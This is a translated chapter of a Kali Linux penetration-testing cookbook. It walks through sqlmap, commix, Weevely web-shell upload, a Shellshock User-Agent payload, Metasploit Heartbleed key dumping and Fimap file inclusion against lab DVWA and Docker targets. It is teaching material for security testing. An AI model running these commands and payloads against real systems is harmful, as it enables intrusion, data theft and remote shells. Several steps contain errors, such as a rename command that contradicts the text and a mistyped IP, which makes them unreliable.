1.  sqlmap 已经确定用户名是可注入和易受攻击的；现在 sqlmap 正在询问您是否想要继续寻找其他易受攻击的参数，还是您想要开始利用已发现易受攻击的参数。通常最好查找所有易受攻击的参数，这样您就可以向开发人员报告所有需要进行输入验证的参数；现在，我们将输入*Y*并按*Enter*，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_027.jpg)

1.  直到所有参数都被测试过才会不断提示；一旦完成，sqlmap 会提示您选择应该利用哪些参数，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_028.jpg)

1.  您可以选择任何您喜欢的参数；作为演示，我们将选择用户名参数并输入`**0**`，然后按*Enter*，立即 sqlmap 将开始检索您在开关中提到的信息，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_029.jpg)

正如您所看到的，sqlmap 可以将数据库表名转储出来，如下面的屏幕截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_030.jpg)

## 工作原理...

在这个示例中，我们学习了如何使用 sqlmap 来检查登录页面上的参数是否容易受到 SQL 注入的攻击。在这个命令中，我们使用了以下开关：

+   `--url`：此开关提供了 sqlmap 的目标 URL。这是运行 sqlmap 所必需的开关。

+   `--data`：这是一个特定的开关，您需要使用它来发送 POST 数据。在我们的示例中，我们发送`wp-username`、`wp-pass`和`wp-submit`及其相应的值作为 POST 数据。

+   `-r`：此开关可以代替`--url`开关。`-r`开关加载带有 POST 数据的请求文件。`/path/to/file`。您可以通过在 Burp 上右键单击代理并将其保存到文件选项来捕获登录页面的 POST 请求以创建请求文件。

+   `--dbs`：如果发现任何参数是易受攻击和可注入的，此开关将获取所有数据库名称。

+   `--tables`：如果发现任何参数是易受攻击和可注入的，此开关将获取数据库中的所有表名。

+   `--is-dba`：此开关检查应用程序使用的数据库用户是否具有 DBA 特权。

+   `QLMAP`：用于查找 URL 参数中的 SQL 注入

# 利用 SQL 注入攻击 URL 参数

SQL 注入可能存在于应用程序的任何地方，例如登录页面、`GET`、`POST`参数、身份验证后，有时甚至存在于 cookies 本身。使用 sqlmap 与我们在上一个示例中使用它并没有太大的不同，但这个示例的目的是帮助您了解 sqlmap 也可以用于利用需要认证后才能访问的页面上的 SQL 注入。

在这个示例中，我们将看看如何使用 sqlmap 来利用已认证页面上的 SQL 注入。使用`-r`开关允许 sqlmap 在检查 URL 时使用请求中的 cookies，无论它们是否可访问。由于 sqlmap 可以处理保存的请求中的 cookies，它可以成功地识别和利用 SQL 注入。

## 准备工作

要完成本示例，您需要在 Oracle Virtualbox 中运行 Kali Linux 并连接到互联网。不需要其他先决条件。

## 操作步骤...

对于本示例，您需要执行以下步骤：

1.  我们将使用**Damn Vulnerable Web Application**（**DVWA**）托管在`http://172.17.0.2`。使用默认的 DVWA 凭据登录，然后单击左侧菜单中的**SQL 注入**。在输入框中输入`1`作为用户 ID，它将显示您的用户详细信息，并在顶部显示错误消息，如下面的屏幕截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_031.jpg)

1.  上述错误消息清楚地指向潜在的 SQL 注入，我们将使用 sqlmap 来利用这个 SQL 注入，使用以下命令：

```
      sqlmap --url="http://172.17.0.2/dvwa/vulnerabilities/sqli/?id=1&       Submit=Submit#" --cookie=" security=low;         PHPSESSID=eu7s6d4urudkbq8gdlgvj4jba2"

```

1.  运行上述命令后，sqlmap 立即确定后端数据库是 MySQL，并要求您确认是否可能跳过任何其他检查。按*Y*并继续，如下面的屏幕截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_032.jpg)

1.  Sqlmap 继续验证易受攻击的参数，并要求用户输入以继续检查其他参数，如下面的屏幕截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_033.jpg)

1.  按下*N*，它会显示易受攻击的参数摘要以及使用的注入类型和查询，如下面的屏幕截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_034.jpg)

1.  在发现 ID 参数容易受到 SQL 注入的情况下，我们修改了原始命令以添加额外的开关，如下面的屏幕截图所示：

```
      sqlmap --url="http://172.17.0.2/dvwa/vulnerabilities/sqli/?id=1&      Submit=Submit#" --cookie=" security=low;       PHPSESSID=k5c4em2sqm6j4btlm0gbs25v26" --current-db --current-user       --hostname

```

1.  运行上述命令后，您可以看到以下输出：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_035.jpg)

1.  同样，您可以使用 sqlmap 中的其他开关继续完全接管 Web 服务器。

## 它是如何工作的...

在本教程中，我们使用 sqlmap 来利用经过身份验证的页面上的 ID 参数，并提取有关数据库、用户、当前用户、当前数据库和主机名等信息。在上述步骤中，我们使用了以下新开关：

+   `--cookie`：此开关使用 HTTP cookie 头来访问经过身份验证的资源

+   `--dbs`：此开关枚举 DBMS 数据库

+   `--users`：此开关枚举 DBMS 用户

+   `--current-user`：此开关检索 DBMS 当前用户

+   `--current-db`：此开关检索 DBMS 当前数据库

+   `--hostname`：此开关检索 DBMS 服务器主机名

使用 commix 进行自动 OS 命令注入

在本章的第一个教程中，我们使用 Burp Scanner 来发现 Web 应用程序中的各种漏洞。正如您所看到的，我们已经通过 Burp 扫描器检测到了 OS 命令注入漏洞。

现在在这个教程中，我们将学习如何使用 commix 工具，它是[comm]and [i]njection e[x]ploiter 的缩写，正如其名字所示，它是一个用于命令注入和利用的自动化工具。我们将使用 commix 来利用 Burp 扫描器识别的入口点。

## 准备工作

要完成本教程，您需要以下内容：

+   在 Oracle Virtualbox/VMware 上运行的 Kali Linux

+   Burp Scanner 的输出，如本章的第一个教程中所示

+   运行在 Docker 上的易受攻击的 Web 应用程序

+   互联网连接

## 如何操作...

对于这个教程，您需要执行以下步骤：

1.  打开 Burp 扫描器**目标**窗口，如前一篇文章所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_036.jpg)

1.  单击 Burp Scanner 识别的命令注入漏洞，转到**请求**选项卡，并观察修改后的请求以及 Burp 接收到的响应。我们将使用 Burp 识别出的命令注入的相同入口参数，并在 commix 中使用它，如下面的屏幕截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_037.jpg)

1.  现在打开终端并输入`commix`；它将在窗口中显示默认的帮助，如下面的屏幕截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_038.jpg)

1.  我们将使用以下命令启动 commix：

```
      commix --url "http://172.17.0.2/dvwa/vulnerabilities/exec/"       --cookie='security=low; PHPSESSID=b69r7n5b2m7mj0vhps39s4db64'       --data='ip=INJECT_HERE&Submit=Submit' -all

```

1.  commix 将检测 URL 是否可达，并获取所有可能的信息，然后询问你是否要打开伪终端 Shell，如下截图所示：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_039.jpg)

1.  如果输入*Y*，你会看到 Shell 提示，如下所示：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_040.jpg)

如果你仔细观察伪随机 Shell 之前的输出，你会注意到 commix 和收集主机名、当前用户、当前用户权限和操作系统和密码文件，如下所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_041.jpg)

1.  你可以在伪终端 Shell 中输入各种命令，并在屏幕上得到输出；例如，输入`pwd`来查看当前工作目录，输入`id`来查看当前用户权限，如下截图所示：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_042.jpg)

## 它是如何工作的...

在这个教程中，我们看到了如何使用 commix 进行命令注入和利用。由于我们已经确定了一个可能存在命令注入的参数，我们使用**INJECT_HERE**来帮助 commix 识别可执行查询并显示输出的易受攻击的参数。此外，我们在工具中使用了以下开关，其目的和描述如下：

+   `--url`：这个开关用于提供目标 URL

+   `--cookie`：这个开关用于向 commix 提供 cookies，如果目标 URL 在认证后面；commix 可以使用 cookies 来达到目标 URL

+   `--data`：这个开关用于提供需要发送到目标 URL 的任何`POST` body 参数，以便能够发出有效的请求

+   `--all`：这个开关用于枚举尽可能多的来自目标 OS X 命令注入的信息，使用这些信息我们可以进一步决定如何使用`netcat`在服务器上获得稳定的 Shell

# 使用 Weevely 进行文件上传漏洞

在这个教程中，我们将使用 Weevely 来利用文件上传漏洞。Weevely 是一个隐秘的 PHP Web Shell，模拟 telnet 样式的连接。当你需要创建一个 Web Shell 来利用文件上传漏洞时，它非常方便。它工作得非常好，以至于你不需要寻找任何工具或 Shell。让我们开始吧。

## 准备工作

要完成本教程，你需要在 Oracle Virtualbox 中运行 Kali Linux 并连接到互联网。不需要其他先决条件。

## 如何做...

对于这个教程，你需要执行以下步骤：

1.  打开目标应用程序的文件上传页面，如下截图所示：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_043.jpg)

1.  打开终端并输入`Weevely`；它将显示用法的示例语法，如下截图所示：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_044.jpg)

1.  现在我们需要生成一个 PHP Shell，可以使用以下命令：

```
      Weevely generate <password-to-connect> /root/weevely.php      Weevely generate uytutu765iuhkj /root/weevely.php

```

1.  输入`ls`，你会看到一个新文件被创建，名为`weevely.php`，因为我们的应用程序只允许上传图片，所以我们需要将这个文件重命名为`.jpg`扩展名，如下命令所示：

```
mv weevely.php agent.php

```

1.  用目标应用程序的文件上传模块打开目标浏览器，点击**浏览**，并从`/root`目录中选择此文件并上传，如下截图所示：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_045.jpg)

1.  成功的消息显示了文件上传的路径。复制路径，打开终端并输入`weevely <Complete-path-to-uploaded-file> <password>`，如下命令所示：

```
      Weevely http://172.17.0.2/dvwa/hackable/uploads/weevely.php.jpg       yoursecretpassword

```

1.  Weevely 将尝试连接到上传的文件，并向你呈现它获取的有限（或受限制的）Shell，你可以在其中运行系统命令，也许可以用它来提升你的权限，如下截图所示：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_046.jpg)

1.  Weevely 提供的另一个很好的功能是，您可以直接从单个命令中使用系统命令。为了理解这一点，请输入`weevely help`，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_047.jpg)

```
      Weevely http://dvwa.hackhunt.com/dvwa/hackable/uploads      /weevely.php.jpg yoursecretpass  :audit.etcpasswd

```

1.  运行此命令时，Weevely 将连接到后门并获取`/etc./passwd`文件，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_048.jpg)

1.  同样，您可以检查 Weevely 提供的其余选项，并从目标服务器中提取信息。您还可以使用 Weevely 进行脚本化自动化。

## 工作原理...

在这个示例中，我们学习了如何使用 Weevely 来利用文件上传漏洞，以及如何使用它来获取稳定的 shell 以提升 root 权限，或者直接使用 Weevely 在目标服务器上运行系统命令。

# 利用 Burp 进行 Shellshock 攻击

在这个示例中，我们将使用 Burp 来利用 Shellshock（CVE-2014-6271）漏洞。如果您还没有听说过 Shellshock 漏洞，也就是 Bash 漏洞，那么它是 GNU bash 远程代码执行漏洞，可以允许攻击者获取对目标机器的访问权限。由于 Bash 被广泛使用，这个漏洞具有巨大的攻击面，并且由于这个漏洞的高严重性和易于利用性，它是 2014 年识别出的最严重的安全问题之一；因此，我们决定演示如何使用 Burp 来利用它。

## 准备工作

要完成本示例，您需要以下内容：

+   在 Oracle Virtualbox/VMware 中运行的 Kali Linux

+   在 Kali 中安装并运行 Docker

+   互联网连接

## 操作步骤...

对于这个示例，您需要执行以下步骤：

1.  我们将从搜索并下载一个来自 Docker hub 的对 Shellshock 存在漏洞的容器开始，使用以下命令：

```
docker search shellshock

```

您将看到以下输出：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_049.jpg)

1.  我们将使用第一个 Docker 映像进行演示，并使用以下命令来拉取 Docker 映像：

```
      docker pull hmlio/vaas-cve-2014-6271

```

1.  现在，我们将使用以下命令将 Docker 映像作为容器运行：

```
docker run hmlio/vaas-cve-2014-6271

```

1.  由于它是在 Kali 中运行的第二个容器，它具有`172.17.0.3`的 IP 地址；您可以使用`docker inspect <container-name>`来查找容器的 IP 地址。现在我们将打开浏览器并访问`72.17.0.3`，您将看到以下网页：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_050.jpg)

1.  由于我们已经配置了浏览器使用 Burp 代理，因此导航到**Proxy** | **HTTP history**选项卡，如下所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_051.jpg)

1.  现在右键单击它，然后单击**Send it to Repeater**，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_052.jpg)

1.  转到 repeater 窗口，并将用户代理更改为以下内容：

```
      User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat       /etc/passwd;'

```

看一下下面的屏幕截图：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_053.jpg)

1.  现在点击**Go**，您将在**Response**窗口中看到`passwd`文件的内容，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_054.jpg)

这就是利用 Burp 轻松利用 shellshock 的方法。

## 工作原理...

在这个示例中，我们搜索并从 Docker hub 下载了一个容器映像，该映像对 Shellshock 存在漏洞。然后我们启动了容器，并将浏览器指向了容器的 IP 地址。我们使用 Burp 代理选择了`/cgi-bin/`请求，并将其发送到 repeater。在 repeater 窗口中，我们将`user agent`更改为 Shellshock 利用字符串，以读取`/etc/passwd`文件，并且我们得到了响应中的`passwd`文件内容。

# 使用 Metasploit 来利用 Heartbleed

在这个配方中，我们将使用 Kali Linux 中的 Metasploit 来利用 Heartbleed 漏洞。利用 Heartbleed 漏洞并不一定要使用 Metasploit。可以使用简单的 Python 脚本或简单的 Burp 插件（在免费版本中）来确定服务器/服务是否容易受到 Heartbleed 漏洞的影响。但是，我们想介绍 Metasploit exploit 和一个辅助模块，有时可能会非常有帮助。

## 准备工作

要完成这个配方，您需要以下内容：

+   Kali Linux 运行在 Oracle Virtualbox/VMware 上

+   在 Kali Linux 上运行的 Docker

+   易受攻击的 Web 应用程序 Docker 容器

+   互联网连接

## 如何做...

对于这个配方，您需要执行以下步骤：

1.  我们将通过以下命令搜索并下载一个来自 Docker hub 的易受 Shellshock 漏洞影响的容器来开始这个配方：

```
      docker search heartbleed

```

您将看到以下输出：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_055.jpg)

1.  我们将使用第一个 Docker 镜像进行演示，并使用以下命令来拉取 Docker 镜像：

```
      docker pull andrewmichaelsmith/docker-heartbleed

```

1.  现在，我们将使用以下命令将 Docker 镜像作为容器运行：

```
      docker run andrewmichaelsmith/docker-heartbleed

```

1.  由于它是我们 Kali 中运行的第三个容器，它具有`172.17.0.4`的 IP 地址。您可以使用`docker inspect <container-name>`来查找您的容器的 IP 地址。我们现在将打开浏览器并访问`72.17.0.4`。您将看到以下网页：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_056.jpg)

1.  使用 VMware/Virtualbox 设置您的 bee-box 镜像，并在 Kali Linux 中打开`msfconsole`，如下所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_057.jpg)

1.  输入`search heartbleed`来查找 Metasploit 中可用的与 Heartbleed 相关的辅助和利用，如下所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_058.jpg)

1.  正如我们所看到的，有一个可用于 Heartbleed 的辅助模块。我们将继续并使用以下命令进行利用：

```
      msf > use auxiliary/scanner/ssl/openssl_heartbleed      msf auxiliary(openssl_heartbleed) >

```

1.  输入`show options`来查看可用选项，如下所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_059.jpg)

1.  您需要根据目标信息更改`rhost`和`rhost`；在我们的情况下，如下所示：

```
      msf > set rhosts 172.17.0.4
      msf > set rport 443
      msf > set action SCAN

```

1.  设置适当的设置后，我们将在`msf`控制台上输入`run`来运行模块，输出如下：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_060.jpg)

1.  该模块已检测到此服务器容易受到 Heartbleed 漏洞的影响。我们现在将继续并将操作从`SCAN`更改为`DUMP`，使用以下命令，如下所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_061.jpg)

1.  更改操作后，我们将再次运行模块，输出如下：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_062.jpg)

1.  从服务器检索的数据已经被转储到了 Metasploit 给出的目录路径上的文件中。我们将继续并将操作从`DUMP`更改为`KEYS`，并最后一次运行模块，看看我们是否可以从服务器检索任何私钥，如下所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_063.jpg)

1.  更改操作后，再次运行模块，看看 Metasploit 是否可以从服务器检索私钥，如下所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_064.jpg)

正如您所看到的，Metasploit 已成功从易受攻击的服务器中提取了私钥。

## 它是如何工作的...

在这个配方中，我们使用 Metasploit 来利用 SSL Heartbleed 漏洞进行利用，可以转储内存数据并提取服务器的私钥。

# 使用 FIMAP 工具进行文件包含攻击（RFI/LFI）

在第一个配方中，Burp Scanner 还确定了文件路径遍历漏洞。在这个配方中，我们将学习如何使用 Fimap 来利用文件路径遍历漏洞。

Fimap 是一个 Python 工具，可以帮助自动查找、准备、审计和最终利用 Web 应用程序中的本地和远程文件包含漏洞。

## 准备工作

要完成这个配方，您需要以下内容：

+   Kali Linux 运行在 Oracle Virtualbox/VMware 上

+   在 Kali Linux 上运行的 Docker

+   易受攻击的 Web 应用 Docker 容器

+   互联网连接

## 操作步骤...

对于这个示例，您需要执行以下步骤：

1.  打开浏览器，转到`http:/dvwa.hackhunt.com/dvwa`，并使用默认凭据登录。从左侧菜单中点击**文件包含**，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_065.jpg)

1.  打开终端并输入`fimap`，将显示版本和作者信息，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_066.jpg)

1.  要使用 Fimap 来利用 LFI/RFI 漏洞，我们需要使用以下命令：

```
      fimap -u 'http://172.17.0.2/dvwa/vulnerabilities       /fi/?page=include.php' --cookie="security=low;         PHPSESSID=b2qfpad4jelu36n6d2o5p6snl7" --enable-blind

```

1.  Fimap 将开始查找服务器上可以读取的本地文件，并在目标易受文件包含攻击时显示它，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_067.jpg)

1.  最后，Fimap 将显示它能够从服务器上读取的所有文件，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_068.jpg)

1.  现在，我们将使用之前使用的带有`-x`结尾的命令，以便继续利用此文件包含并获取服务器的 shell，如下所示：

```
      fimap -u http://dvwa.hackhunt.com/dvwa/vulnerabilities      /fi/?page=include.php        --cookie="PHPSESSID=376221ac6063449b0580c289399d89bc;      security=low" -x

```

1.  Fimap 将启动交互式菜单并要求输入；选择`1`，因为我们的域是`dvwa.hackhunt.com`，如下所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_069.jpg)

1.  在下一步中，它将要求您选择要开始的易受攻击的漏洞；对于我们的示例，我们将选择`1`，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_070.jpg)

1.  在下一步中，它会给您两个选项。`1`是生成直接 shell，第二个是使用 pentest monkey 脚本创建反向 shell。对于我们的演示，我们将使用`1`，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_071.jpg)

1.  如您所见，我们已成功接收到 shell，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_072.jpg)

1.  我们可以使用此通道获取稳定的 shell，并最终提升到服务器上的 root 权限。

## 工作原理...

在这个示例中，我们使用 Fimap 来利用本地和远程文件包含，并在服务器上获取 shell 访问权限。在这个示例中，我们使用了以下开关：

+   -u：这表示目标 URL。

+   --cookie：由于我们的注入点在身份验证之后，我们必须使用此选项来设置 cookie，以便 Fimap 可以访问注入点。

+   --enable-blind：当 Fimap 无法检测到某些内容或没有出现错误消息时，此开关非常有用。请注意，此模式将导致大量请求。

+   -x：用于利用远程文件包含漏洞并自动生成 shell。
